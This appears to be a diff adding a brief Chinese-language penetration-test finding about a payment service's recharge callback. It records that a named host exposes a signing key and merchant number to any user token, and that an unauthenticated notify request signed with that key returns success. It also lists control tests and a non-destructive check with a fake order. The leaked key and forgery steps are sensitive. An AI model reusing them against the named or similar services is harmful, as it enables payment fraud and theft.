@@ -1,0 +1,6 @@
+# E3 充值回调免鉴权 + signKey 泄露 → 伪造支付成功
+目标: https://zsapi.lejiqu.com/app/RechargeAuditInfo/*
+实测: 普通用户 token GET /getChannelConfig/hmzf -> hmzf-signKey=c77ddf2a69b348a08f40eb47b3138f7f, mchNo=M2103685845321879552
+无 token POST /notify/hmzf(按 MD5(sorted k=v&key) 算签名) -> SUCCESS
+对照: 空体 fail(sign not exists) / 错 sign fail(verify fail) / 未知 mch fail(signKey not exists)
+验证使用不存在的订单号 ZZNORDER8888，账号余额与充值记录未变化
